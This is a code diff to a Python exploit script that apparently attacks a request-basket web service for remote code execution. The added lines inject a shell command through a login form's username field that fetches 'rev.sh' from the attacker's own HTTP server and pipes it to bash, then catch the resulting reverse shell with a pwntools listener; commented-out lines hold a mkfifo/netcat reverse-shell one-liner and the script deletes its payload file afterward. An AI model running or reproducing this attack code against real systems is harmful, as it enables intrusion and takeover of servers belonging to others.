@@ -39,6 +39,9 @@ def kill_processes():
         http_server.terminate()
         http_server.wait()
 
+        time.sleep(2)
+        os.system("rm rev.sh")
+
 
 def exit_handler(signum, frame):
     sys.exit(1)
@@ -86,7 +89,19 @@ def start_http_server(python_version):
         sys.exit(1)
 
 
+def listen_and_interact(nc_port):
+    listener = listen(nc_port, timeout=20).wait_for_connection()
+
+    if listener.sock:
+        print("\n")
+        listener.interactive()
+
+
+
 def get_rce():
+    p = log.progress("Exploting...")
+    p.status("Creating a basket")
+
     # choose from all lowercase letter
     letters = string.ascii_lowercase
     basket_name = ''.join(random.choice(letters) for i in range(range_basket_name))
@@ -109,15 +124,53 @@ def get_rce():
     except requests.exceptions.RequestException as e:
         print("An error occurred:", e)
 
+    p.status(f"basket [{basket_name}] created")
+    time.sleep(2)
+
     if r.status_code == 201:
+        p.success("Sending the payload to get the RCE")
+
         res = requests.request(method="GET", url=url_vulnerable_service + basket_name)
 
         if res.status_code == 200:
-            try:
-                subprocess.Popen(["nc", "-lvnp", str(nc_port)])
-            except FileNotFoundError:
-                print("Netcat (nc) is not installed or not in the PATH.")
 
+            threading.Thread(target=os.system, args=[f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"]).start()
+
+            # listener = listen(nc_port, timeout=20).wait_for_connection()
+            # Listener en segundo plano
+            listener_thread = threading.Thread(target=listen_and_interact, args=(nc_port,))
+            listener_thread.daemon = True  # El hilo se detendrá cuando el programa principal termine
+            listener_thread.start()
+
+            # Esperar hasta que el proceso de escucha esté en segundo plano antes de continuar
+            listener_thread.join()
+
+            p.success("RCE success")
+
+
+    # try:
+            #     # subprocess.Popen(["nc", "-lvnp", str(nc_port)])
+            #     nc_thread = threading.Thread(target=os.system, args=[f"nc -lvnp {nc_port}"])
+            #     nc_thread.start()
+            #     nc_thread.join(timeout=1)
+            # except FileNotFoundError:
+            #     print("Netcat (nc) is not installed or not in the PATH.")
+            #
+            # os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker} {nc_port} >/tmp/f' > rev.sh | chmod +x rev.sh")
+            # attack_thread = threading.Thread(target=os.system, args=[f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"])
+            # attack_thread.start()
+
+
+
+            # # Crear el script de reverse shell
+            # rev_shell_script = f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker} {nc_port} >/tmp/f' > rev.sh && chmod +x rev.sh"
+            # subprocess.run(rev_shell_script, shell=True)
+            #
+            # # Ejecutar el comando curl para activar el reverse shell
+            # curl_command = f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"
+            # subprocess.run(["/bin/bash", "-c", curl_command])
+            #
+            # subprocess.run(["rm", "rev.sh"])
 
 
 # if r.status_code == 201:
